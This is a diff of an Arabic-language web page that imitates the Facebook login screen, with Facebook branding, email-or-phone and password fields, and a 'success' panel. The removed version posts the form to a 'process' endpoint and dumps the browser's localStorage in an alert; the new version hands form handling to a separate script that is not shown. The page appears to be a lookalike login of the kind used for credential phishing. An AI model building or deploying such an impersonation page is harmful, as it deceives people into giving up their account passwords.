@@ -1,57 +1,41 @@
-<!doctype html>
-<html lang="ar"> 
- <head> 
-  <meta charset="UTF-8"> 
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"> 
-  <title>تسجيل الدخول - فيسبوك</title> 
-  <link rel="stylesheet" href="styles.css"> 
- </head> 
- <body> 
-  <div class="container"> 
-   <div class="logo"> 
-    <h1>Facebook</h1> 
-    <p>تواصل مع الأصدقاء والعالم من حولك.</p> 
-   </div> <!-- ✅ قسم تسجيل الدخول --> 
-   <div id="login-box" class="login-box"> 
-    <form id="login-form" method="post" action="process"> <label for="username">البريد الإلكتروني أو رقم الهاتف</label> 
-     <input type="text" id="username" name="username" placeholder="أدخل البريد أو الهاتف" required> <label for="password">كلمة المرور</label> 
-     <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required> <button type="submit" name="login">تسجيل الدخول</button> <a href="#">هل نسيت كلمة المرور؟</a> 
-     <hr> <button type="button" class="signup" name="signup">إنشاء حساب جديد</button> 
-    </form> 
-   </div> <!-- ✅ قسم نجاح التسجيل (يظهر فقط عند نجاح العملية) --> 
-   <div id="success-box" class="success-box" style="display: none;"> 
-    <h2>✅ تم التسجيل بنجاح!</h2> 
-    <p>تم إنشاء حسابك بنجاح، يمكنك الآن تسجيل الدخول.</p> <button onclick="resetForm()">العودة إلى تسجيل الدخول</button> 
-   </div> 
-  </div> <!-- ✅ جافا سكريبت للتحكم في العرض --> 
-  <script>
-        document.getElementById("login-form").onsubmit = function(event) {
-            event.preventDefault(); // منع إعادة تحميل الصفحة
-            var username = document.getElementById("username").value.trim();
-            var password = document.getElementById("password").value.trim();
+<!DOCTYPE html>
+<html lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>تسجيل الدخول - فيسبوك</title>
+    <link rel="stylesheet" href="styles.css">
+</head>
+<body>
+    <div class="container">
+        <div class="logo">
+            <h1>Facebook</h1>
+            <p>تواصل مع الأصدقاء والعالم من حولك.</p>
+        </div>
 
-            if (username === "" || password === "") {
-                alert("❌ يجب ملء جميع الحقول!");
-                return;
-            }
+        <!-- ✅ قسم تسجيل الدخول -->
+        <div id="login-box" class="login-box">
+            <form id="login-form">
+                <label for="username">البريد الإلكتروني أو رقم الهاتف</label>
+                <input type="text" id="username" name="username" placeholder="أدخل البريد أو الهاتف" required>
+                <label for="password">كلمة المرور</label>
+                <input type="password" id="password" name="password" placeholder="أدخل كلمة المرور" required>
+                <button type="submit" name="login">تسجيل الدخول</button>
+                <a href="#">هل نسيت كلمة المرور؟</a>
+                <hr>
+                <button type="button" class="signup">إنشاء حساب جديد</button>
+            </form>
+        </div>
 
-            // ✅ محاكاة نجاح التسجيل دون الحاجة إلى صفحة منفصلة
-            document.getElementById("login-box").style.display = "none";
-            document.getElementById("success-box").style.display = "block";
-        };
+        <!-- ✅ قسم نجاح التسجيل -->
+        <div id="success-box" class="success-box" style="display: none;">
+            <h2>✅ تم التسجيل بنجاح!</h2>
+            <p>تم إنشاء حسابك بنجاح، يمكنك الآن تسجيل الدخول.</p>
+            <button onclick="resetForm()">العودة إلى تسجيل الدخول</button>
+        </div>
+    </div>
 
-        function resetForm() {
-            document.getElementById("login-box").style.display = "block";
-            document.getElementById("success-box").style.display = "none";
-            document.getElementById("login-form").reset();
-        }
-    </script> 
-  <script>
-    window.onload = function() {
-        console.log("LocalStorage Data:", localStorage);
-        alert("LocalStorage Data: " + JSON.stringify(localStorage));
-    };
-  </script>
-  <script src="script.js"></script>
- </body>
+    <!-- ✅ ربط ملف جافا سكريبت -->
+    <script src="script.js"></script>
+</body>
 </html>
